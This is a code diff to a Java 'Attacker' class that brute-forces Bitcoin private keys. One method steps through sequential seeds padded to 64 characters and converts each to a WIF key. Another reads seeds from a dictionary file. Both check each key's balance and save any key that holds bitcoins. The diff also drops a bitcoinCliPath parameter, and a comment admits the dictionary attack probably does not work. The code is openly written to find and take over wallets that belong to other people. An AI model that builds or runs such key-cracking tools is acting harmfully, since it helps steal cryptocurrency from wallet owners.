@@ -25,21 +25,28 @@ public class Attacker {
     private Float balance;
     private String succesfullKey;
     private String bitcoinCliPath;
+    private String seedString;
 
-    public void numberAttack(BigInteger seed,String bitcoinCliPath){
+    public void numberAttack(BigInteger seed){
         //BigInteger seed = BigInteger.valueOf(0);
+
+
         while(true) {
 
-            String key = keyGenerator.convertToWIF(String.valueOf(seed));
+            seedString = String.valueOf(seed);
+            while(seedString.length()<64){
+                seedString = "0"+seedString;
+            }
+
+            String key = keyGenerator.convertToWIF(seedString);
 
             //If there are any bitcoins on this private/public key, program should sout it and write it to a file.
-            balance = balanceSearcher.getBalance(String.valueOf(seed),bitcoinCliPath);
+            balance = balanceSearcher.getBalance(String.valueOf(seed));
             if(balance>0){
                 succesfullKey = key;
                 bitcoinsFoundReaction();
                 break;
             }
-            System.out.println(key);
             seed = seed.add(BigInteger.ONE);
         }
     }
@@ -64,7 +71,9 @@ public class Attacker {
         }
     }
 
-    public void dictionaryAttack(File dictionary,String bitcoinCliPath){
+    //This shouldn' probably work
+    //also hasnt sense
+    public void dictionaryAttack(File dictionary){
         while(true) {
             BufferedReader bf;
             String seed = "";
@@ -81,7 +90,7 @@ public class Attacker {
 
 
             //If there are any bitcoins on this private/public key, program should sout it and write it to a file.
-            balance = balanceSearcher.getBalance(key,bitcoinCliPath);
+            balance = balanceSearcher.getBalance(key);
             if(balance>0){
                 succesfullKey = key;
                 bitcoinsFoundReaction();
